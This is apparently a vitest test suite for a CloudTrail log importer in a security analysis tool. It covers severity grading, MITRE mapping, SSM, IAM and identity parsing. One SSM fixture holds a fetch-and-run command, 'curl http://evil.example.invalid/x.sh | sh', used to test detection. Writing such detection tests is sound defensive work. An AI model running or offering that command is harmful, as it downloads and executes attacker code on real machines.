import { describe, it, expect } from "vitest";
import { parseCloudTrail } from "../../src/analysis/awsImport.js";
import { canonicalConformanceIssues } from "../../src/analysis/canonicalEvent.js";

function record(over: object): object {
  return {
    eventTime: "2023-06-01T10:00:00Z",
    eventSource: "iam.amazonaws.com",
    eventName: "GetUser",
    awsRegion: "us-east-1",
    sourceIPAddress: "203.0.113.10",
    userAgent: "aws-cli/2.0",
    readOnly: true,
    eventType: "AwsApiCall",
    userIdentity: { type: "IAMUser", userName: "bob", arn: "arn:aws:iam::123:user/bob", accountId: "123" },
    ...over,
  };
}
function envelope(...recs: object[]): string {
  return JSON.stringify({ Records: recs });
}

describe("parseCloudTrail — action-derived severity", () => {
  it("reads the { Records: [...] } envelope and derives High for CreateAccessKey", () => {
    const r = parseCloudTrail(envelope(record({ eventName: "CreateAccessKey", readOnly: false })));
    expect(r.format).toBe("cloudtrail");
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.description).toContain("AWS CreateAccessKey (iam)");
    expect(e.description).toContain("by bob");
    expect(e.description).toContain("from 203.0.113.10");
    expect(e.severity).toBe("High");
    expect(e.mitreTechniques).toContain("T1098.001");
    expect(e.sources).toEqual(["AWS CloudTrail"]);
    expect(e.timestamp).toBe("2023-06-01T10:00:00Z");
    expect(r.iocs.find((i) => i.type === "ip")?.value).toBe("203.0.113.10");
  });

  it("High for disabling CloudTrail logging (defense evasion)", () => {
    const r = parseCloudTrail(
      envelope(
        record({ eventName: "StopLogging", eventSource: "cloudtrail.amazonaws.com", readOnly: false }),
      ),
    );
    expect(r.events[0].severity).toBe("High");
    expect(r.events[0].mitreTechniques).toContain("T1562.008");
  });

  it("read-only Describe/Get with no verdict stays Info", () => {
    const r = parseCloudTrail(
      envelope(record({ eventName: "DescribeInstances", eventSource: "ec2.amazonaws.com" })),
    );
    expect(r.events[0].severity).toBe("Info");
  });

  it("a denied call (errorCode) is bumped to at least Medium", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "DescribeInstances",
          eventSource: "ec2.amazonaws.com",
          errorCode: "Client.UnauthorizedOperation",
        }),
      ),
    );
    expect(r.events[0].severity).toBe("Medium");
    expect(r.events[0].description).toContain("[Client.UnauthorizedOperation]");
  });

  it("grades Lambda CreateFunction (priv-esc primitive) as Medium", () => {
    const fn = parseCloudTrail(
      envelope(record({ eventName: "CreateFunction", eventSource: "lambda.amazonaws.com", readOnly: false })),
    );
    expect(fn.events[0].severity).toBe("Medium");
    expect(fn.events[0].mitreTechniques).toContain("T1648");
  });

  // The removed `passrole` rule was tested with a record AWS cannot emit: `iam:PassRole` is a
  // permission checked during another call, never an `eventName` of its own. The fixture proved
  // the table entry worked and proved nothing about any real CloudTrail log, so the suite stayed
  // green while the rule was dead. Pin the absence so it is not re-added by the same reasoning.
  it("does not grade a fabricated PassRole eventName (no such CloudTrail API)", () => {
    const r = parseCloudTrail(envelope(record({ eventName: "PassRole", readOnly: false })));
    expect(r.events[0].mitreTechniques).not.toContain("T1098");
  });

  it("grades STS GetSessionToken as Low with T1078.004", () => {
    const r = parseCloudTrail(
      envelope(record({ eventName: "GetSessionToken", eventSource: "sts.amazonaws.com", readOnly: false })),
    );
    expect(r.events[0].severity).toBe("Low");
    expect(r.events[0].mitreTechniques).toContain("T1078.004");
  });
});

describe("parseCloudTrail — console login & root", () => {
  it("a failed ConsoleLogin is Medium (brute force)", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "ConsoleLogin",
          eventSource: "signin.amazonaws.com",
          readOnly: false,
          responseElements: { ConsoleLogin: "Failure" },
          errorMessage: "Failed authentication",
          userIdentity: { type: "IAMUser", userName: "bob" },
        }),
      ),
    );
    expect(r.events[0].severity).toBe("Medium");
    expect(r.events[0].mitreTechniques).toContain("T1110");
  });

  it("a root console login is High and flagged [root]", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "ConsoleLogin",
          eventSource: "signin.amazonaws.com",
          readOnly: false,
          responseElements: { ConsoleLogin: "Success" },
          userIdentity: { type: "Root", arn: "arn:aws:iam::123:root" },
        }),
      ),
    );
    expect(r.events[0].severity).toBe("High");
    expect(r.events[0].description).toContain("[root]");
  });

  it("uses the assumed-role issuer as the principal", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "PutBucketPolicy",
          eventSource: "s3.amazonaws.com",
          readOnly: false,
          userIdentity: { type: "AssumedRole", sessionContext: { sessionIssuer: { userName: "AdminRole" } } },
        }),
      ),
    );
    expect(r.events[0].description).toContain("by AdminRole");
    expect(r.events[0].severity).toBe("High");
  });
});

describe("parseCloudTrail — inputs, floor & edges", () => {
  it("reads NDJSON (CloudTrail Lake / Athena)", () => {
    const text = [
      record({ eventName: "CreateAccessKey", readOnly: false }),
      record({ eventName: "GetCallerIdentity" }),
    ]
      .map((o) => JSON.stringify(o))
      .join("\n");
    const r = parseCloudTrail(text);
    expect(r.format).toBe("cloudtrail");
    expect(r.events).toHaveLength(2);
  });

  it("does not turn an AWS-service caller into an IP IOC", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "RunInstances",
          eventSource: "ec2.amazonaws.com",
          sourceIPAddress: "ec2.amazonaws.com",
          readOnly: false,
        }),
      ),
    );
    expect(r.iocs.filter((i) => i.type === "ip")).toHaveLength(0);
  });

  it("applies a severity floor", () => {
    const text = envelope(
      record({ eventName: "CreateAccessKey", readOnly: false }), // High
      record({ eventName: "DescribeInstances", eventSource: "ec2.amazonaws.com" }), // Info
    );
    const r = parseCloudTrail(text, { minSeverity: "Medium" });
    expect(r.events).toHaveLength(1);
    expect(r.events[0].severity).toBe("High");
  });

  it("reports empty for a non-CloudTrail file", () => {
    const r = parseCloudTrail(JSON.stringify({ foo: "bar" }));
    expect(r.format).toBe("empty");
    expect(r.events).toHaveLength(0);
  });
});

// #931 item 7 — Systems Manager remote execution through the CloudTrail importer.
describe("parseCloudTrail — SSM remote execution", () => {
  const ssm = (
    eventName: string,
    requestParameters: object,
    responseElements: object = {},
    over: object = {},
  ) =>
    record({
      eventSource: "ssm.amazonaws.com",
      eventName,
      readOnly: false,
      eventID: `evt-${eventName}-${JSON.stringify(requestParameters).length}`,
      requestParameters,
      responseElements,
      ...over,
    });

  it("SendCommand with a shell payload is High + T1651, names the target, document, id and status, and says 'requested'", () => {
    const r = parseCloudTrail(
      envelope(
        ssm(
          "SendCommand",
          {
            documentName: "AWS-RunShellScript",
            instanceIds: ["i-0abc123def456789a"],
            parameters: { commands: ["curl http://evil.example.invalid/x.sh | sh"] },
          },
          { command: { commandId: "cmd-1", documentVersion: "1", status: "Pending" } },
        ),
      ),
    );
    const e = r.events[0];
    expect(e.severity).toBe("High");
    expect(e.mitreTechniques).toContain("T1651");
    expect(e.description).toContain("[AWS-RunShellScript@1] cmd-1 Pending: requested → i-0abc123def456789a");
    expect(e.description).toContain('cmd: "curl http://evil.example.invalid/x.sh | sh"');
    expect(e.description).toContain("result is not in CloudTrail");
    expect(e.description).not.toMatch(/executed|as root/);
    expect(e.canonical?.process?.commandLine).toBe("curl http://evil.example.invalid/x.sh | sh");
    expect(e.canonical?.cloud?.resource).toBe("i-0abc123def456789a");
  });

  it("two commands to one instance, or one command to two instances, are distinct rows; a duplicate record folds", () => {
    const a = ssm(
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"], parameters: { commands: ["id"] } },
      { command: { commandId: "cmd-A" } },
    );
    const b = ssm(
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"], parameters: { commands: ["whoami"] } },
      { command: { commandId: "cmd-B" } },
    );
    const c = ssm(
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ["i-2"], parameters: { commands: ["id"] } },
      { command: { commandId: "cmd-C" } },
    );
    expect(parseCloudTrail(envelope(a, b, c)).events).toHaveLength(3);
    expect(parseCloudTrail(envelope(a, a)).events).toHaveLength(1);
  });

  it("a denied SendCommand is Medium and says the request did not execute; two denied attempts stay two rows", () => {
    const d1 = ssm(
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"] },
      {},
      { errorCode: "AccessDenied", eventID: "e1" },
    );
    const d2 = ssm(
      "SendCommand",
      { documentName: "AWS-RunShellScript", instanceIds: ["i-1"] },
      {},
      { errorCode: "AccessDenied", eventID: "e2" },
    );
    const r = parseCloudTrail(envelope(d1, d2));
    expect(r.events).toHaveLength(2);
    expect(r.events[0].severity).toBe("Medium");
    expect(r.events[0].description).toContain("did not execute");
  });

  it("a successful TerminateSession is Info at the importer, not the generic mutating-call Low", () => {
    const r = parseCloudTrail(envelope(ssm("TerminateSession", { sessionId: "s-1" }, {})));
    expect(r.events[0].severity).toBe("Info");
    const disc = parseCloudTrail(envelope(ssm("ListCommands", {}, {}, { readOnly: false })));
    expect(disc.events[0].severity).toBe("Info");
  });

  it("the document, id, status and target survive a long principal, user agent and tag selector", () => {
    const targets = [
      { Key: "tag:Name", Values: Array.from({ length: 50 }, (_, i) => `host-${i}-${"x".repeat(40)}`) },
    ];
    const r = parseCloudTrail(
      envelope(
        ssm(
          "SendCommand",
          { documentName: "AWS-RunShellScript", targets, parameters: { commands: ["id"] } },
          { command: { commandId: "cmd-77", status: "Pending" } },
          {
            userAgent: "u".repeat(300),
            userIdentity: { type: "IAMUser", userName: "n".repeat(200), accountId: "123" },
          },
        ),
      ),
    );
    const d = r.events[0].description;
    expect(d.length).toBeLessThanOrEqual(600);
    expect(d).toContain("[AWS-RunShellScript] cmd-77 Pending: requested → ");
    expect(d).toContain('cmd: "id"');
  });

  it("a routine patch scan is Low; a port-forwarding session is High with the tunnel technique; listing documents is Info", () => {
    const patch = ssm(
      "SendCommand",
      { documentName: "AWS-RunPatchBaseline", instanceIds: ["i-1"], parameters: { Operation: ["Scan"] } },
      { command: { commandId: "cmd-P" } },
    );
    const tunnel = ssm(
      "StartSession",
      {
        target: "i-1",
        documentName: "AWS-StartPortForwardingSessionToRemoteHost",
        parameters: { host: ["db.example.invalid"], portNumber: ["3389"] },
      },
      { sessionId: "s-1" },
    );
    const list = ssm("ListDocuments", {}, {}, { readOnly: true });
    const r = parseCloudTrail(envelope(patch, tunnel, list));
    const by = (n: string) => r.events.find((e) => e.description.includes(`AWS ${n} `))!;
    expect(by("SendCommand").severity).toBe("Low");
    expect(by("StartSession").severity).toBe("High");
    expect(by("StartSession").mitreTechniques).toEqual(expect.arrayContaining(["T1651", "T1572"]));
    expect(by("StartSession").description).toContain("→ i-1 → db.example.invalid:3389");
    expect(by("ListDocuments").severity).toBe("Info");
    expect(by("ListDocuments").mitreTechniques).toEqual(["T1526"]);
  });
});

describe("parseCloudTrail — IAM changes (#931 item 6)", () => {
  const ACCT = "111122223333";
  const doc = (statements: unknown): string =>
    JSON.stringify({ Version: "2012-10-17", Statement: statements });
  const iam = (
    eventName: string,
    requestParameters: object,
    responseElements: object | null = null,
    over: object = {},
  ) =>
    record({
      eventSource: "iam.amazonaws.com",
      eventName,
      readOnly: false,
      recipientAccountId: ACCT,
      eventID: `evt-${eventName}-${JSON.stringify(requestParameters).length}`,
      requestParameters,
      responseElements,
      ...over,
    });

  it("a Put with an Allow *:* document is High, reads the document's words, names the object, and carries the caveats", () => {
    const r = parseCloudTrail(
      envelope(
        iam("PutRolePolicy", {
          roleName: "deploy",
          policyName: "inline-admin",
          policyDocument: doc([{ Effect: "Allow", Action: "*", Resource: "*" }]),
        }),
      ),
    );
    const e = r.events[0];
    expect(e.severity).toBe("High");
    expect(e.description).toContain("replaces inline policy role=deploy policyName=inline-admin");
    expect(e.description).toContain("all actions on all resources");
    expect(e.description).toContain("previous document not in this record");
    expect(e.description).toContain("effective access depends on controls not in this record");
    expect(e.description).not.toMatch(/\b(widen|narrow|tighten)/i);
    expect(e.canonical?.cloud?.resource).toBe("deploy");
  });
  it("a Detach stays Low and SAYS what it did — an eradication step reads as one", () => {
    const r = parseCloudTrail(
      envelope(
        iam("DetachRolePolicy", {
          roleName: "deploy",
          policyArn: "arn:aws:iam::aws:policy/AdministratorAccess",
        }),
      ),
    );
    const e = r.events[0];
    expect(e.severity).toBe("Low");
    expect(e.description).toContain("detaches managed policy role=deploy policy=AdministratorAccess");
    expect(e.description).toContain("its document and version are not in this record");
    expect(e.description).not.toMatch(/grants all/);
  });
  it("CreateRole trusting an external account is High and names the account; same-account is the table's Medium", () => {
    const trust = (acct: string) =>
      doc([{ Effect: "Allow", Principal: { AWS: `arn:aws:iam::${acct}:root` }, Action: "sts:AssumeRole" }]);
    const r = parseCloudTrail(
      envelope(
        iam("CreateRole", { roleName: "ext", assumeRolePolicyDocument: trust("999988887777") }),
        iam("CreateRole", { roleName: "own", assumeRolePolicyDocument: trust(ACCT) }),
      ),
    );
    const by = (role: string) => r.events.find((e) => e.description.includes(`role=${role}`))!;
    expect(by("ext").severity).toBe("High");
    expect(by("ext").description).toContain("external account 999988887777");
    expect(by("own").severity).toBe("Medium");
    expect(by("own").description).toContain("same-account");
  });
  it("RunInstances with an instance profile is Medium + T1078.004 and says 'instance profile', never 'role'", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventSource: "ec2.amazonaws.com",
          eventName: "RunInstances",
          readOnly: false,
          recipientAccountId: ACCT,
          requestParameters: { iamInstanceProfile: { arn: `arn:aws:iam::${ACCT}:instance-profile/web` } },
          responseElements: { instancesSet: { items: [{ instanceId: "i-0aaa" }] } },
        }),
      ),
    );
    const e = r.events[0];
    expect(e.severity).toBe("Medium");
    expect(e.mitreTechniques).toContain("T1078.004");
    expect(e.description).toContain(
      `passing instance profile arn:aws:iam::${ACCT}:instance-profile/web → i-0aaa`,
    );
    expect(e.description).not.toMatch(/passing role/);
  });
  it("two Glue dev endpoints created with two roles by one actor are two Medium rows", () => {
    const ep = (name: string, role: string) =>
      record({
        eventSource: "glue.amazonaws.com",
        eventName: "CreateDevEndpoint",
        readOnly: false,
        recipientAccountId: ACCT,
        requestParameters: { endpointName: name, roleArn: `arn:aws:iam::${ACCT}:role/${role}` },
      });
    const r = parseCloudTrail(envelope(ep("a", "glue-a"), ep("b", "glue-admin")));
    expect(r.events).toHaveLength(2);
    expect(new Set(r.events.map((e) => e.aggKey)).size).toBe(2);
    for (const e of r.events) {
      expect(e.severity).toBe("Medium");
      expect(e.description).toMatch(/passing role arn:aws:iam::111122223333:role\/glue-\w+ → [ab]/);
    }
  });
  it("a PassRole denial is Medium and says denied — the role was not passed", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventSource: "lambda.amazonaws.com",
          eventName: "CreateFunction20150331",
          readOnly: false,
          recipientAccountId: ACCT,
          errorCode: "AccessDenied",
          errorMessage: `User: arn:aws:iam::${ACCT}:user/bob is not authorized to perform: iam:PassRole on resource: arn:aws:iam::${ACCT}:role/admin`,
          requestParameters: { functionName: "f", role: `arn:aws:iam::${ACCT}:role/admin` },
        }),
      ),
    );
    const e = r.events[0];
    expect(e.severity).toBe("Medium");
    expect(e.description).toContain(`role passing denied: arn:aws:iam::${ACCT}:role/admin`);
    expect(e.description).not.toMatch(/\bpassing role\b/);
  });
  it("a denied boundary removal says 'attempted' next to the head and stays Medium; a successful one is High", () => {
    const r = parseCloudTrail(
      envelope(
        iam("DeleteRolePermissionsBoundary", { roleName: "a" }, null, { errorCode: "AccessDenied" }),
        iam("DeleteRolePermissionsBoundary", { roleName: "b" }),
      ),
    );
    const by = (role: string) => r.events.find((e) => e.description.includes(`role=${role}`))!;
    expect(by("a").severity).toBe("Medium");
    expect(by("a").description).toMatch(
      /^AWS DeleteRolePermissionsBoundary \(iam\) by bob from 203\.0\.113\.10 in us-east-1 IAMUser \(long-term\)[^—]*attempted to remove permissions boundary — denied \(AccessDenied\)/,
    );
    expect(by("b").severity).toBe("High");
    expect(by("b").description).toContain("removes permissions boundary role=b — may increase permissions");
  });
  it("two policies attached to one role in one batch are two rows; the same record twice is one", () => {
    const att = (arn: string) => iam("AttachRolePolicy", { roleName: "r", policyArn: arn });
    const r = parseCloudTrail(
      envelope(
        att("arn:aws:iam::aws:policy/A"),
        att("arn:aws:iam::aws:policy/B"),
        att("arn:aws:iam::aws:policy/A"),
      ),
    );
    const keys = new Set(r.events.map((e) => e.aggKey));
    expect(keys.size).toBe(2);
  });
  it("the description of a maximal row keeps the head, the outcome, the object and the caveats inside 600", () => {
    const r = parseCloudTrail(
      envelope(
        iam(
          "PutRolePolicy",
          {
            roleName: "r".repeat(300),
            policyName: "n".repeat(300),
            policyDocument: doc([
              {
                Effect: "Allow",
                Action: Array.from({ length: 200 }, (_, i) => `svc${i}:Action${i}`),
                Resource: "*",
                Condition: { Bool: { "aws:MultiFactorAuthPresent": "true" } },
              },
            ]),
          },
          null,
          {
            errorCode: "AccessDenied",
            userAgent: "u".repeat(500),
            userIdentity: {
              type: "IAMUser",
              userName: "p".repeat(500),
              arn: `arn:aws:iam::${ACCT}:user/x`,
              accountId: ACCT,
            },
          },
        ),
      ),
    );
    const d = r.events[0].description;
    expect(d.length).toBeLessThanOrEqual(600);
    expect(d).toMatch(/^AWS PutRolePolicy \(iam\) by p+/);
    expect(d).toContain("attempted to replace inline policy — denied (AccessDenied)");
    expect(d).toContain("role=rrrr");
    expect(d).toContain("previous document not in this record");
    expect(d).toContain("conditional — not evaluated here");
    expect(d).toContain("effective access depends on controls not in this record");
    expect(d).toContain("[AccessDenied]");
  });
  it("two documents the reader cannot digest, in records without an eventID, stay two rows", () => {
    const deep = (leaf: string) => {
      let d: unknown = { Effect: "Allow", Action: "*", Resource: leaf };
      for (let i = 0; i < 40; i++) d = { x: d }; // past the reader's depth bound, within JSON's
      return { Statement: [d] };
    };
    const put = (leaf: string) =>
      record({
        eventSource: "iam.amazonaws.com",
        eventName: "PutRolePolicy",
        readOnly: false,
        requestParameters: { roleName: "r", policyName: "p", policyDocument: deep(leaf) },
      });
    const r = parseCloudTrail(envelope(put("a"), put("b")));
    expect(r.events).toHaveLength(2);
    expect(new Set(r.events.map((e) => e.aggKey)).size).toBe(2);
    expect(r.events[0].description).toContain("unreadable");
  });
  it("cloud.resource is the untruncated object the call names, or a binding's destination", () => {
    const longGroup = "g".repeat(120);
    const r = parseCloudTrail(
      envelope(
        iam("AttachGroupPolicy", { groupName: longGroup, policyArn: "arn:aws:iam::aws:policy/X" }),
        record({
          eventSource: "ec2.amazonaws.com",
          eventName: "RunInstances",
          readOnly: false,
          recipientAccountId: ACCT,
          requestParameters: { iamInstanceProfile: { name: "web" } },
          responseElements: { instancesSet: { items: [{ instanceId: "i-0bbb" }] } },
        }),
        record({
          eventSource: "lambda.amazonaws.com",
          eventName: "CreateFunction20150331",
          readOnly: false,
          recipientAccountId: ACCT,
          requestParameters: { functionName: "fn-x", role: `arn:aws:iam::${ACCT}:role/lr` },
        }),
      ),
    );
    const by = (name: string) => r.events.find((e) => e.description.startsWith(`AWS ${name}`))!;
    expect(by("AttachGroupPolicy").canonical?.cloud?.resource).toBe(longGroup);
    expect(by("RunInstances").canonical?.cloud?.resource).toBe("i-0bbb");
    expect(by("CreateFunction20150331").canonical?.cloud?.resource).toBe("fn-x");
  });
  it("the existing table grades are unchanged for IAM calls the decoder does not raise", () => {
    const r = parseCloudTrail(
      envelope(iam("CreateUser", { userName: "new" }, { user: { userId: "AIDAEXAMPLE" } })),
    );
    expect(r.events[0].severity).toBe("Medium");
    expect(r.events[0].description).toContain("creates user user=new userId=AIDAEXAMPLE");
  });
});

describe("parseCloudTrail — identities and credentials (#931 item 5)", () => {
  const ACCT = "111122223333";
  const OTHER = "444455556666";
  const ROLE_ARN = `arn:aws:iam::${ACCT}:role/admin-role`;
  const assumedRole = (over: object = {}) => ({
    type: "AssumedRole",
    principalId: "AROAEXAMPLEID:i-0abc123",
    arn: `arn:aws:sts::${ACCT}:assumed-role/admin-role/i-0abc123`,
    accountId: ACCT,
    accessKeyId: "ASIAEXAMPLEKEY000001",
    sessionContext: {
      sessionIssuer: {
        type: "Role",
        principalId: "AROAEXAMPLEID",
        arn: ROLE_ARN,
        accountId: ACCT,
        userName: "admin-role",
      },
      attributes: { creationDate: "2024-05-01T09:00:00Z", mfaAuthenticated: "false" },
    },
    ...over,
  });
  it("a plain row carries the caller's identity words after the head, and the typed credential, issuer and accounts in the envelope", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "DescribeInstances",
          eventSource: "ec2.amazonaws.com",
          readOnly: true,
          userIdentity: assumedRole(),
          recipientAccountId: ACCT,
          eventID: "evt-1",
        }),
      ),
    );
    const e = r.events[0];
    // The identity slot is 150 characters at most: the issuer ARN, last by design, is what clips.
    expect(e.description).toMatch(
      /^AWS DescribeInstances \(ec2\) by admin-role from 203\.0\.113\.10 in us-east-1 AssumedRole key ASIAEXAMPLEKEY000001 \(temporary\) session i-0abc123 since 2024-05-01T09:00:00Z CloudTrail mfaAuthenticated=false issuer Role arn:aws:i… \[ua: aws-cli\/2\.0\]$/,
    );
    expect(e.canonical?.authentication).toMatchObject({
      credentialId: "ASIAEXAMPLEKEY000001",
      issuer: ROLE_ARN,
      mechanism: "AssumedRole",
    });
    expect(e.canonical?.cloud).toMatchObject({
      principalType: "AssumedRole",
      accountId: ACCT,
      recipientAccountId: ACCT,
    });
  });
  it("an AssumeRole row is findable by the key it issued: object the role, target the credential", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "AssumeRole",
          eventSource: "sts.amazonaws.com",
          readOnly: true,
          requestParameters: { roleArn: ROLE_ARN, roleSessionName: "deploy" },
          responseElements: {
            assumedRoleUser: {
              arn: `arn:aws:sts::${ACCT}:assumed-role/admin-role/deploy`,
              assumedRoleId: "AROAEXAMPLEID:deploy",
            },
            credentials: { accessKeyId: "ASIAEXAMPLEISSUED001", expiration: "May 1, 2024, 10:00:00 AM" },
          },
          recipientAccountId: ACCT,
        }),
      ),
    );
    const e = r.events[0];
    expect(e.description).toContain(
      `issues temporary credentials role ${ROLE_ARN} session deploy → key ASIAEXAMPLEISSUED001 expires May 1, 2024, 10:00:00 AM`,
    );
    expect(e.canonical?.object).toMatchObject({ kind: "cloud_principal", id: ROLE_ARN });
    expect(e.canonical?.target).toMatchObject({
      kind: "other",
      id: "ASIAEXAMPLEISSUED001",
      name: "temporary credential",
    });
    expect(e.severity).toBe("Info");
  });
  it("an issuance without response evidence has outcome unknown in the envelope, and a delegate provider survives the identity slot", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "AssumeRoot",
          eventSource: "sts.amazonaws.com",
          readOnly: false,
          requestParameters: { targetPrincipal: OTHER, taskPolicyArn: { arn: "x" } },
          eventID: "no-response",
        }),
        record({
          eventName: "AssumeRole",
          eventSource: "sts.amazonaws.com",
          readOnly: true,
          requestParameters: { roleArn: ROLE_ARN, roleSessionName: "s" },
          eventID: "no-response-2",
        }),
        record({
          eventName: "DescribeInstances",
          eventSource: "ec2.amazonaws.com",
          readOnly: true,
          userIdentity: assumedRole({
            invokedByDelegate: { accountId: OTHER },
            sessionContext: {
              sessionIssuer: {
                type: "Role",
                principalId: "AROAEXAMPLEID",
                arn: ROLE_ARN,
                accountId: ACCT,
                userName: "admin-role",
              },
              attributes: { creationDate: "2024-05-01T09:00:00Z", mfaAuthenticated: "false" },
              sourceIdentity: "x".repeat(60),
            },
          }),
          eventID: "delegate",
        }),
      ),
      { aggregate: false },
    );
    const by = (id: string) => r.events.find((e) => e.canonical?.evidence.rawRecords[0]?.recordId === id)!;
    expect(by("no-response").canonical?.event.outcome).toBe("unknown");
    expect(by("no-response").severity).toBe("Medium");
    expect(by("no-response").description).toContain("requested to issue ROOT session credentials");
    expect(by("no-response-2").canonical?.event.outcome).toBe("unknown");
    expect(by("delegate").description).toContain(
      `invoked by delegate provider account ${OTHER} (delegated permissions)`,
    );
  });
  it("AssumeRoot is High on success and Medium when denied", () => {
    const root = (over: object) =>
      record({
        eventName: "AssumeRoot",
        eventSource: "sts.amazonaws.com",
        readOnly: false,
        requestParameters: {
          targetPrincipal: OTHER,
          taskPolicyArn: { arn: "arn:aws:iam::aws:policy/root-task/IAMAuditRootUserCredentials" },
        },
        ...over,
      });
    const r = parseCloudTrail(
      envelope(
        root({ responseElements: { credentials: { accessKeyId: "ASIAEXAMPLEROOT00001", expiration: "x" } } }),
        root({ errorCode: "AccessDenied", eventID: "e2" }),
      ),
    );
    const by = (s: string) => r.events.find((e) => e.description.includes(s))!;
    expect(by("issues ROOT session credentials").severity).toBe("High");
    expect(by("attempted to issue ROOT session credentials").severity).toBe("Medium");
  });
  it("the two records of one cross-account action are one row with two pointers, the named principal kept", () => {
    const shared = "shared-evt-1";
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "GetObject",
          eventSource: "s3.amazonaws.com",
          readOnly: true,
          userIdentity: { type: "AWSAccount", principalId: "AIDAEXAMPLE", accountId: ACCT },
          recipientAccountId: OTHER,
          eventID: "e-owner",
          sharedEventID: shared,
          requestParameters: { bucketName: "b", key: "k" },
        }),
        record({
          eventName: "GetObject",
          eventSource: "s3.amazonaws.com",
          readOnly: true,
          userIdentity: assumedRole(),
          recipientAccountId: ACCT,
          eventID: "e-caller",
          sharedEventID: shared,
          requestParameters: { bucketName: "b", key: "k" },
        }),
      ),
    );
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.count ?? 1).toBe(1);
    expect(e.description).toContain("AssumedRole key ASIAEXAMPLEKEY000001");
    expect(e.description).toContain(`[also in account ${OTHER}]`);
    expect(e.canonical?.evidence.rawRecords.map((p) => p.recordId)).toEqual(["e-caller", "e-owner"]);
    // Both accounts are typed: the caller's in cloud.accountId, the resource owner's in
    // cloud.recipientAccountId — a Hunt on either finds the action.
    expect(e.canonical?.cloud).toMatchObject({ accountId: ACCT, recipientAccountId: OTHER });
    // …and the value's provenance points at the owner's record, the one that carries it.
    const ownerPointer = e.canonical?.evidence.rawRecords.find((p) => p.recordId === "e-owner")!.locator;
    expect(e.canonical?.fieldProvenance["cloud.recipientAccountId"]).toMatchObject({
      origin: "raw",
      rawFields: ["recipientAccountId"],
      recordLocators: [ownerPointer],
    });
  });
  it("two distinct cross-account actions that share every other dimension stay two rows with all four pointers", () => {
    const pair = (shared: string, suffix: string) => [
      record({
        eventName: "GetObject",
        eventSource: "s3.amazonaws.com",
        readOnly: true,
        userIdentity: { type: "AWSAccount", principalId: "AIDAEXAMPLE", accountId: ACCT },
        recipientAccountId: OTHER,
        eventID: `owner-${suffix}`,
        sharedEventID: shared,
        requestParameters: { bucketName: "b", key: "k" },
      }),
      record({
        eventName: "GetObject",
        eventSource: "s3.amazonaws.com",
        readOnly: true,
        userIdentity: assumedRole(),
        recipientAccountId: ACCT,
        eventID: `caller-${suffix}`,
        sharedEventID: shared,
        requestParameters: { bucketName: "b", key: "k" },
      }),
    ];
    const r = parseCloudTrail(envelope(...pair("shared-1", "1"), ...pair("shared-2", "2")));
    expect(r.events).toHaveLength(2);
    expect(
      r.events.flatMap((e) => e.canonical?.evidence.rawRecords.map((p) => p.recordId) ?? []).sort(),
    ).toEqual(["caller-1", "caller-2", "owner-1", "owner-2"]);
    expect(r.events.every((e) => (e.count ?? 1) === 1)).toBe(true);
  });
  it("an owner-first replica pair keeps the Identity Center caller (type Unknown + onBehalfOf) over the account view", () => {
    const shared = "shared-ic";
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "GetObject",
          eventSource: "s3.amazonaws.com",
          readOnly: true,
          userIdentity: { type: "AWSAccount", principalId: "AIDAEXAMPLE", accountId: ACCT },
          recipientAccountId: OTHER,
          eventID: "owner",
          sharedEventID: shared,
          requestParameters: { bucketName: "b", key: "k" },
        }),
        record({
          eventName: "GetObject",
          eventSource: "s3.amazonaws.com",
          readOnly: true,
          userIdentity: {
            type: "Unknown",
            accountId: ACCT,
            credentialId: "cred-9",
            onBehalfOf: {
              userId: "u-9",
              identityStoreArn: "arn:aws:identitystore::111122223333:identitystore/d-1",
            },
          },
          recipientAccountId: ACCT,
          eventID: "caller",
          sharedEventID: shared,
          requestParameters: { bucketName: "b", key: "k" },
        }),
      ),
    );
    expect(r.events).toHaveLength(1);
    expect(r.events[0].description).toContain("IdentityCenterUser key cred-9 (temporary)");
    expect(r.events[0].canonical?.authentication?.credentialId).toBe("cred-9");
  });
  it("a type-absent Identity Center record still has a canonical actor, by its composite id", () => {
    const r = parseCloudTrail(
      envelope(
        record({
          eventName: "ListBuckets",
          eventSource: "s3.amazonaws.com",
          readOnly: true,
          userIdentity: {
            accountId: ACCT,
            credentialId: "cred-3",
            onBehalfOf: {
              userId: "u-3",
              identityStoreArn: "arn:aws:identitystore::111122223333:identitystore/d-1",
            },
          },
          eventID: "ic-no-type",
        }),
      ),
    );
    const e = r.events[0];
    expect(e.canonical?.actor).toMatchObject({
      kind: "cloud_principal",
      id: "arn:aws:identitystore::111122223333:identitystore/d-1#u-3",
    });
    expect(e.canonical?.fieldProvenance["actor.id"]?.rawFields).toEqual([
      "userIdentity.onBehalfOf.identityStoreArn",
      "userIdentity.onBehalfOf.userId",
    ]);
  });
  it("replica attribution does not depend on input order, even when the caller replica omits its account", () => {
    const shared = "shared-order";
    const owner = record({
      eventName: "GetObject",
      eventSource: "s3.amazonaws.com",
      readOnly: true,
      userIdentity: { type: "AWSAccount", principalId: "AIDAEXAMPLE", accountId: ACCT },
      recipientAccountId: OTHER,
      eventID: "owner",
      sharedEventID: shared,
      requestParameters: { bucketName: "b", key: "k" },
    });
    const caller = record({
      eventName: "GetObject",
      eventSource: "s3.amazonaws.com",
      readOnly: true,
      userIdentity: {
        credentialId: "cred-4",
        onBehalfOf: {
          userId: "u-4",
          identityStoreArn: "arn:aws:identitystore::111122223333:identitystore/d-1",
        },
      },
      recipientAccountId: ACCT,
      eventID: "caller",
      sharedEventID: shared,
